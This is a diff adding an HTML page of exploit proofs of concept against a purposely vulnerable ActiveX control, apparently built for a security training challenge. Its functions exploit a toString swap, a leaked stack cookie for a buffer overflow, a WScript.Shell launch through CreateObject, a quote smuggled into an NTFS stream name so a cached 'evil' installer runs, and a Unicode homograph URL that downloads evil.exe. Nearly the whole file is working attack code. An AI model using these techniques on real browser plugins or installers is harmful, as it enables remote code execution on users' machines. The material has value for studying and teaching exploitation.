@@ -1,0 +1,130 @@
+<html>
+<body>
+<object id=obj border=1 classid="clsid:3AE51322-4D0E-4AAD-9F67-FD3925EE5FE1">
+NO OBJECT
+</object>
+<script>
+    function doRunUtility() {
+        var o = new Object();
+
+        o.toString = function () {
+            if (this.stepped) {
+                return "calc";
+            }
+            else {
+                this.stepped = true;
+                return "notepad";
+            }
+        }
+
+        obj.RunUtility(o);
+    }
+
+    function doReverseString() {
+        var s = "A";
+
+        while (s.length < 511) {
+            s += "A";
+        }
+
+        alert(s.length);
+
+        alert(obj.ReverseString(s));
+    }
+
+    function doCreateRandomString() {
+		var str = obj.CreateRandomString(0);
+		while(str.length < 512)
+		{
+			str = obj.CreateRandomString(0);
+		}
+				
+        // Need to reverse everything
+        var stackCookie = String.fromCharCode(0x8888) + String.fromCharCode(0x8888) + String.fromCharCode(0x8888) + String.fromCharCode(0x8888) + str.substr(513, 1) + str.substr(512, 1);
+		alert("Cookie: " + escape(stackCookie));
+		
+        var exp = stackCookie + str.substr(0, 512);
+        
+        obj.ReverseString(exp);
+    }
+
+    function doTransform() {
+        var xml = "<root/>";
+        var req = new ActiveXObject("Msxml2.XMLHTTP");
+        req.open("GET", "hack.xsl", false);
+        req.send();
+        var xslt = req.responseText;
+        alert(xslt);
+        alert(obj.TransformXSLT(xml, xslt));
+    }
+
+    function doCreateObject() {
+    	obj.CreateObject("XWScript.Shell").Exec("calc");
+    }
+
+    function doRunInstallerEx() {
+		obj.RunInstallerEx("installer.exe");
+		obj.RunInstallerEx("evilhash.exe");
+    }
+	
+	function doRunInstaller()
+	{
+		// Download installer.exe:X, forgets to delete it
+		try {
+		obj.RunInstaller("http://localhost:8080/installer.exe:X", 
+		"tDYMvmnZEvfja9X2LJZCc4A/4mOt2irCuZdCuf45sLHbetcrP3OT5/h82IAhE8UWxXxQcddGNDLFOz5RvuoZXHD//+TFwOADu1E6/GoHUBsbqbXYRJcxIkQu2fPtGgAEfvefE8XPa0AxcLLvWa66WJAbRiSOys0Icrb1wv8uklw=");
+		} catch(e) {}
+		
+		// Download installer.exe:X", quote allowed in stream name, will terminate createprocess commandline so will run cached evil
+		obj.RunInstaller("http://localhost:8081/installer.exe:X\"", 
+		"tDYMvmnZEvfja9X2LJZCc4A/4mOt2irCuZdCuf45sLHbetcrP3OT5/h82IAhE8UWxXxQcddGNDLFOz5RvuoZXHD//+TFwOADu1E6/GoHUBsbqbXYRJcxIkQu2fPtGgAEfvefE8XPa0AxcLLvWa66WJAbRiSOys0Icrb1wv8uklw=");
+	}
+
+    function doCreateObjectURL() {
+		try { obj.RunInstallerEx("installer2.exe"); } catch(e) {} 
+		    	
+        if(document.location.search.length < 2)
+		{
+			var s = document.location.href + "?";
+			while(s.length < 1024)
+			{
+				s += "A";
+			}
+			
+			document.location.href = s;
+		}
+		else
+		{
+			obj.CreateObject("WScript.Shell").Exec("calc");
+		}
+    }
+
+    function doCreateByteStream()
+    {
+		var stm = obj.CreateByteStream(0xFFFFFFFF);		
+		alert(stm.ReadBytes(0x400000, 128));
+    }
+	
+	function doRunInstallerExEx() {
+		// Resolves to www.notintheslightestisthisreal.xn--combadger-780b.com
+		obj.RunInstallerExEx("http://www.notintheslightestisthisreal.com\u1234badger.com/evil.exe");
+	}
+
+    try {
+	//doCreateObjectURL();
+	//doRunInstallerEx();
+	//doTransform();	
+	//doCreateObject();
+	//doCreateByteStream();
+	//doCreateRandomString();
+	//doRunInstaller();
+	//doRunUtility();
+	//doRunInstallerExEx();
+	
+	alert(obj.GetHint("RunInstaller"));
+} catch(e) {
+	alert("Exception: " + e.message + " " + (e.number + 0x100000000).toString(16));
+}
+</script>
+</body>
+</html>
